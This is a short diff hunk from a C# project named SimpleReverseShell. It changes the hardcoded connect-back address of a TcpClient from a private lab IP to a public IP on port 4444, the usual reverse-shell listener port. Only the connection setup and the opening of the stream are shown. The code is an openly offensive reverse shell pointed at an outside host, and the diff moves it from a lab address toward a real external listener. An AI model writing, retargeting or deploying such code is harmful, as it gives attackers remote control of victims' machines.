@@ -16,7 +16,7 @@ namespace SimpleReverseShell
 
     public void Start()
     {
-      using (TcpClient client = new TcpClient("192.168.126.128", 4444))
+      using (TcpClient client = new TcpClient("172.104.237.62", 4444))
       {
         using (Stream stream = client.GetStream())
         {
